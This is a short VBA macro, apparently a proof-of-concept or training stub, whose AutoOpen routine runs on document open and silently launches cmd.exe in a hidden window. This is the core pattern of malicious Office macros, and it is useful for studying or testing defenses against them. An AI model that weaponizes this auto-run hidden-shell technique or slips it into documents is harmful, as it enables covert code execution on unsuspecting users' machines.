Sub AutoOpen()
 MyMacro
End Sub

Sub MyMacro()
 Dim str As String
 str = "cmd.exe"
 Shell str, vbHide
End Sub
